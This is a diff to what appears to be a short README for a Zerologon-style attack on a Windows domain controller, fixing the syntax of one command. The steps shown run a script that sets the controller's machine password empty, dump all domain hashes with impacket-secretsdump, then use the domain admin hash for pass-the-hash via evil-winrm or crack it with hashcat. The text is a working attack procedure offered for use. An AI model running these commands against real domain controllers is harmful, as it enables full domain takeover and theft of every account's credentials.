@@ -6,7 +6,7 @@
 
 #### 1) python3 set_empty_pw.py NETBIOS_NAME DC_IP 
 
-#### 2) If attempt was successful, then: impacket-secretsdump -just-dc -no-pass NETBIOS_NAME\$DC_IP
+#### 2) If attempt was successful, then: impacket-secretsdump -just-dc -no-pass DOMAIN.LOCAL/NETBIOS_NAME\$DC_IP
 
 #### 3) When you dump the domain admin hash, you can use it to Pass-the-Hash via evil-winrm or attempt to crack it offline with hashcat
 
